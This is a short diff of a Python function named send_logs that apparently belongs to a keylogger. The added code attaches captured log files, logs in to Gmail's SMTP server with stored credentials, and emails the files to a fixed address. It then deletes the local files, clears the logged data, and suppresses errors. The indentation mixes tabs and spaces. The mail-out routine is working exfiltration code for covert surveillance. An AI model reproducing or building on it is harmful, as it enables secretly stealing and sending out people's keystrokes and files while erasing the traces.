@@ -104,7 +104,7 @@ def send_logs():
 
 				filename = delete_file[0].split('/')[2]
 
-                part = MIMEBase('application','octect-stream')
+				part = MIMEBase('application','octect-stream')
 				part.set_payload((attachment).read())
 				encoders.encode_base64(part)
 				part.add_header('content-disposition','attachment;filename='+str(filename))
@@ -112,3 +112,26 @@ def send_logs():
 
 				text = msg.as_string()
 				print('test msg.as_string')
+
+                s = smtplib.SMTP('smtp.gmail.com',587)
+				s.ehlo()
+				s.starttls()
+				print('starttls')
+				s.ehlo()
+				s.login(fromAddr,fromPswd)
+				s.sendmail(fromAddr,toAddr,text)
+				print('sent mail')
+				attachment.close()
+				s.close()
+
+				os.remove(delete_file[0])
+				del logged_data[1:]
+				del delete_file[0:]
+				print('delete data/files')
+
+				count += 1
+
+			except Exception as errorString:
+				print('[!] send_logs // Error.. ~ %s' % (errorString))
+				pass
+
